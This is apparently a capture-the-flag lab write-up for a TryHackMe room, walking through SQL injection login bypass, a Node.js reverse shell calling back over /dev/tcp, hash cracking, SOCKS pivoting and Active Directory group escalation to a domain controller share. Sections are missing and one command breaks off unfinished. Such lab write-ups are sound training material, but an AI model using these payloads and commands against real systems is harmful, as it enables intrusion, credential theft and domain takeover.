TryHackMe Dead Drop - Writeup
================================

Target information
------------------
Target IPs: 192.168.11.100, 192.168.11.51, 192.168.11.200
VHost: deaddrop.thm

1. Initial port scan and web enumeration
----------------------------------------
Only the web server at 192.168.11.200 responded to the initial ping checks.

Command:
nmap -A 192.168.11.200

Relevant output:
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
80/tcp open  http    Node.js Express framework
|_http-title: Did not follow redirect to /login

I visited:
http://deaddrop.thm/login

Before attempting to log in, I began enumerating the web application. I entered a single quote (') in the login form and received an error. I then tried the SQL injection payload:

Username: admin' or 1==1-- -
Password: random value

The login succeeded and I gained access to the dashboard.

The dashboard already contained an uploaded JavaScript file. The application also identified itself as an Express server, suggesting that uploaded JavaScript could be executed server-side.

2. Reverse shell
----------------
I created revers.js with the following content:

require('child_process').exec(
  'bash -c "bash -i >& /dev/tcp/192.168.21.6/4444 0>&1"'
);

After uploading the file and triggering its execution, I received a reverse shell.

Note: 192.168.21.6 is the callback IP recorded in the payload above.

3. Finding and cracking the svc-drop password hash
--------------------------------------------------
Inside the backup folder, I found shadow.bak. It contained:

svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::

The $6$ prefix identifies a SHA-512 crypt password hash.

I cracked the hash using Hashcat mode 1800.

Recovered credentials:

Username: svc-drop
Password: dropsofjupiter

6. Internal network discovery
-----------------------------
On the svc-drop shell, I checked the resolver configuration:

resolvectl status

Relevant output:

Link 2 (ens5)
    Current Scopes: DNS
    Current DNS Server: 192.168.11.2
    DNS Servers: 192.168.11.2
    DNS Domain: eu-west-1.compute.internal

This identified 192.168.11.2 as the configured DNS server.

I then checked the neighbour table:

ip neigh

Relevant output:

192.168.11.100 dev ens5 lladdr 0a:ff:d0:cc:f3:0d STALE
192.168.11.250 dev ens5 lladdr 0a:ff:e9:17:47:d9 STALE
192.168.11.51 dev ens5 FAILED
192.168.11.2 dev ens5 lladdr 0a:ff:cf:9e:c6:69 STALE
192.168.11.1 dev ens5 lladdr 0a:ff:cf:9e:c6:69 REACHABLE

Initial observations:
- 192.168.11.100: later identified as the Domain Controller.
- 192.168.11.250: internal Linux server; later identified as running Squid.
- 192.168.11.51: neighbour resolution failed; its role remains unknown.
- 192.168.11.2: configured DNS server.
- 192.168.11.1: network gateway.

A STALE neighbour entry does not mean that a host is offline; it means the entry has not recently been confirmed.

8. Creating a SOCKS tunnel through the compromised web server
-------------------------------------------------------------
I used the SSH access to svc-drop as a pivot into the internal network.

On my local Kali machine, I started a dynamic SOCKS5 tunnel:

ssh -N -D 1080 svc-drop@192.168.11.200

I kept this SSH process running in its own terminal.

I created a separate Proxychains configuration so the system-wide configuration remained unchanged:

cp /etc/proxychains4.conf ~/deaddrop-proxychains.conf

I configured the local copy:

sed -i \
-e 's/^#dynamic_chain/dynamic_chain/' \
-e 's/^strict_chain/#strict_chain/' \
-e 's/^socks4[[:space:]]*127\.0\.0\.1[[:space:]]*9050/socks5 127.0.0.1 1080/' \
~/deaddrop-proxychains.conf

I verified the settings:

grep -nE 'dynamic_chain|strict_chain|proxy_dns|socks4|socks5' ~/deaddrop-proxychains.conf

Relevant output:

10:dynamic_chain
18:#strict_chain
60:proxy_dns
161:socks5 127.0.0.1 1080

From this point, I ran internal network tools through:

proxychains4 -f ~/deaddrop-proxychains.conf

If the SSH tunnel stops, the local SOCKS listener on 127.0.0.1:1080 disappears and the tunnel must be restarted.

11. Discovering the AddMember permission
----------------------------------------
In BloodHound, I examined the j.harris account and the ITSupport-Admins group.

The group description stated:

IT Support administrators (delegated DA-equivalent rights)

The relevant permission identified in the graph was:

AddMember

This permission allowed j.harris to add itself to the ITSupport-Admins group.

The target group for the escalation was:

ITSupport-Admins

--------------------------------------
I checked whether BloodyAD was installed:

which bloodyAD

proxychains4 -f ~/deaddrop-proxychains.conf bloodyAD \

14. Locating the Domain Controller flag
---------------------------------------
I connected to the C$ share and listed the Administrator desktop:

proxychains4 -f ~/deaddrop-proxychains.conf smbclient //192.168.11.100/C$ \
-U 'deaddrop.loc/j.harris%DropsOfJupiter2026!' \
-c 'cd Users/Administrator/Desktop; ls'

Output:

desktop.ini
EC2 Feedback.website
EC2 Microsoft Windows Guide.website
flag.txt

The Domain Controller flag was located at:

C:\Users\Administrator\Desktop\flag.txt

The flag file was found, but its contents had not yet been retrieved at the time this writeup was assembled.

To retrieve it:

proxychains4 -f ~/deaddrop-proxychains.conf smbclient //192.168.11.100/C$ \
-U 'deaddrop.loc/j.harris%DropsOfJupiter2026!' \
-c 'cd Users/Administrator/Desktop; get flag.txt'

Then read the downloaded file locally:

cat flag.txt
